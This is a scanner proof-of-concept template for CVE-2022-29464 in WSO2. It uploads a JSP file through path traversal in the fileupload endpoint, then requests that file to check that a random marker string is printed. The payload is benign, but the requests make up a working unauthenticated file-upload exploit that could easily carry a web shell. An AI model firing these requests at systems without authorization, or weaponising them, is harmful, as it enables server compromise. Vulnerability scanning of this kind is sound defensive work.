name: poc-yaml-wso2-cve-2022-29464-fileupload
binding: 38715669-da53-4d43-8620-97159e949be4
manual: true
detail:
    author: Monday
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2022-29464
    vulnerability:
        id: CT-422080
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    filename: randomLowercase(7)
    randstr: randomLowercase(40)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /fileupload/toolsAny
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
                Upgrade-Insecure-Requests: "1"
                urn: uploadFiles
            body: "-----------------------------250033711231076532771336998311\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/jaggeryapps/publisher/{{filename}}.jsp\";filename=\"{{filename}}.jsp\"\r\n\r\n\n<% out.print(\"{{randstr}}\"); %>\r\n-----------------------------250033711231076532771336998311-- "
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: POST
            path: /fileupload/toolsAny
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
                Upgrade-Insecure-Requests: "1"
                urn: uploadFiles
            body: "-----------------------------250033711231076532771336998311\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{filename}}.jsp\";filename=\"{{filename}}.jsp\"\r\n\r\n\n<% out.print(\"{{randstr}}\"); %>\r\n-----------------------------250033711231076532771336998311-- "
        expression: response.status == 200
    r2:
        request:
            cache: true
            method: GET
            path: /publisher/{{filename}}.jsp
        expression: response.status == 200 && response.body.bcontains(bytes(randstr))
    r3:
        request:
            cache: true
            method: GET
            path: /authenticationendpoint/{{filename}}.jsp
        expression: response.status == 200 && response.body.bcontains(bytes(randstr))
expression: r0() && r2() || r1() && r3()
